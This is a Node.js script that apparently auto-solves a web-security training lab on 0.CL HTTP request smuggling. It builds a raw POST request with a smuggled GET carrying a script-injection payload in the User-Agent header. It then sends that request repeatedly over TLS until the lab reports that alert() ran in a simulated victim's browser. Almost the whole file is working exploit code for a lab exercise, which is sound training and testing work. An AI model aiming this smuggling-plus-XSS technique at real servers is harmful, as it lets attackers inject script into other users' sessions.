const { URL } = require('url');

const { isSolved, runLab, waitForSolved } = require('./_common.cjs');
const { sendRawTlsRequest, sleep } = require('./_smuggling.cjs');

const TITLE = '0.CL request smuggling';
const PATH = '/web-security/request-smuggling/advanced/lab-request-smuggling-0cl-request-smuggling';

function buildZeroClRequest(host, postId) {
  const smuggledRequest = [
    `GET /post?postId=${postId} HTTP/1.1`,
    `Host: ${host}`,
    'User-Agent: "><script>alert(1)</script>',
    'Connection: close',
    '',
    '',
  ].join('\r\n');

  return [
    'POST / HTTP/1.1',
    `Host: ${host}`,
    `Content-Length: ${Buffer.byteLength(smuggledRequest, 'utf8')}`,
    'Connection: keep-alive',
    '',
    smuggledRequest,
  ].join('\r\n');
}

runLab({
  title: TITLE,
  path: PATH,
  solve: async ({ page, labUrl }) => {
    if (await isSolved(page, labUrl)) {
      return;
    }

    const { host, hostname } = new URL(labUrl);

    for (const postId of [1, 2]) {
      const rawRequest = buildZeroClRequest(host, postId);

      for (let attempt = 0; attempt < 8; attempt += 1) {
        // eslint-disable-next-line no-await-in-loop
        await sendRawTlsRequest(hostname, rawRequest, 6500);
        // eslint-disable-next-line no-await-in-loop
        if (await waitForSolved(page, labUrl, 12000, 2000)) {
          return;
        }
        // eslint-disable-next-line no-await-in-loop
        await sleep(3000);
      }
    }

    throw new Error('0.CL request smuggling did not trigger alert() in Carlos\'s browser');
  },
});
